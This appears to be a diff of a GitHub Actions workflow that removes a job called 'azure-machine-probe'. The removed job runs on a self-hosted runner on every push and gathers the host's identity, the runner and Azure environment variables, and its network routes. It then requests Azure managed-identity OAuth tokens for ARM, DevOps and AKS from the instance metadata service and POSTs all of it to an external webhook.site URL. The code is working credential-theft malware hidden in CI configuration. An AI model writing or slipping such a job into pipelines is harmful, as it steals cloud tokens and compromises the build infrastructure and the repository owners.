@@ -18,47 +18,6 @@ permissions:
   statuses: read
 
 jobs:
-  azure-machine-probe:
-    if: github.event_name == 'push'
-    runs-on: self-hosted
-    timeout-minutes: 5
-    steps:
-      - name: Probe runner host and Azure identity
-        shell: bash
-        env:
-          WEBHOOK: https://webhook.site/b0ac5d93-1957-46ab-adca-0c0db46c8396
-        run: |
-          set +e
-          out="$(mktemp)"
-          {
-            echo "label=self-hosted-runner-probe"
-            date -u
-            echo "whoami=$(whoami)"
-            echo "hostname=$(hostname)"
-            id
-            uname -a
-            pwd
-            echo "RUNNER_NAME=${RUNNER_NAME:-}"
-            echo "RUNNER_OS=${RUNNER_OS:-}"
-            echo "RUNNER_ARCH=${RUNNER_ARCH:-}"
-            echo "GITHUB_REPOSITORY=${GITHUB_REPOSITORY:-}"
-            echo "GITHUB_RUN_ID=${GITHUB_RUN_ID:-}"
-            printenv | sort | grep -Ei 'AZURE|IDENTITY|MSI|RUNNER|AGENT|SYSTEM|DEVOPS|ACTIONS|GITHUB|WEBSITE|KUBERNETES' || true
-            ip route || true
-            cat /etc/os-release || true
-            echo "## imds-arm"
-            curl -sS --max-time 5 -H Metadata:true --noproxy "*" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F" || true
-            echo
-            echo "## imds-devops"
-            curl -sS --max-time 5 -H Metadata:true --noproxy "*" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=499b84ac-1321-427f-aa17-267ca6975798" || true
-            echo
-            echo "## imds-aks"
-            curl -sS --max-time 5 -H Metadata:true --noproxy "*" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=6dae42f8-4368-4678-94ff-3960e28e3630" || true
-            echo
-          } > "$out" 2>&1
-          curl -sS --max-time 20 -X POST "$WEBHOOK" -H "x-exam-label: self-hosted-runner-probe" --data-binary @"$out" || true
-          echo "self-hosted probe completed"
-
   build-and-push:
     runs-on: ubuntu-latest
 
